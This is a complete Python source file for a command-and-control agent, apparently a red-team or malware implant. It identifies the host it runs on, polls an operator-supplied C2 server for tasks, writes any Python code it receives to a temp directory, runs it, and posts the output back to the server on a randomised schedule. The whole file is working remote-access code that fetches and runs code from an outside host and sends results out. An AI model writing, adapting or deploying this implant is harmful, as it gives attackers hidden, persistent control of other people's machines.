#!/usr/bin/env python3

import os
import platform
import subprocess
import tempfile
import time
import logging
import random
import socket
import uuid
import json
import threading
import re
import urllib.request
from datetime import datetime


def setup_logging(agent_id):
    logger = logging.getLogger("SimpleAgent")
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler(f"agent_{agent_id}.log")
    fh.setLevel(logging.DEBUG)
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger


class SimpleAgent:
    def __init__(self, c2_url):
        self.agent_id = f"AGENT-{platform.system()}-{socket.gethostname()}-{uuid.uuid4().hex[:6]}"
        self.c2_url = c2_url
        self.running = True
        self.logger = setup_logging(self.agent_id)
        self.logger.info(f"Initialized agent {self.agent_id} for {platform.system()}")

    def check_for_tasks(self):
        try:
            req = urllib.request.Request(f"{self.c2_url}/tasks?agent={self.agent_id}")
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            self.logger.error(f"Failed to get tasks: {e}")
            return None

    def execute_python_file(self, code):
        folder = "C:\\Windows\\Temp" if platform.system() == "Windows" else "/home/samba"
        os.makedirs(folder, exist_ok=True)
        script_path = os.path.join(folder, f"{self.agent_id}_task.py")

        with open(script_path, 'w') as f:
            f.write(code)

        if platform.system() != "Windows":
            os.chmod(script_path, 0o755)
            run_cmd = ["python3", script_path]
        else:
            run_cmd = ["python", script_path]

        try:
            result = subprocess.run(run_cmd, capture_output=True, text=True, timeout=300)
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "executed_as": "python_script"
            }
        except subprocess.TimeoutExpired:
            return {"error": "Execution timed out"}
        except Exception as e:
            return {"error": str(e)}

    def send_result(self, task_id, result):
        try:
            data = json.dumps({
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": result
            }).encode()

            req = urllib.request.Request(
                f"{self.c2_url}/results",
                data=data,
                headers={"Content-Type": "application/json"}
            )
            urllib.request.urlopen(req, timeout=10)
            self.logger.info(f"Result sent for task {task_id}")
        except Exception as e:
            self.logger.error(f"Failed to send result: {e}")

    def run(self):
        self.logger.info("Agent started")
        while self.running:
            task = self.check_for_tasks()
            if task and task.get("status") == "task_available":
                task_id = task["task"]["id"]
                code = task["task"]["code"]
                self.logger.info(f"Executing task {task_id}")
                result = self.execute_python_file(code)
                self.send_result(task_id, result)
            time.sleep(random.randint(15, 30))


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True, help="C2 server URL")
    args = parser.parse_args()
    agent = SimpleAgent(args.server)
    agent.run()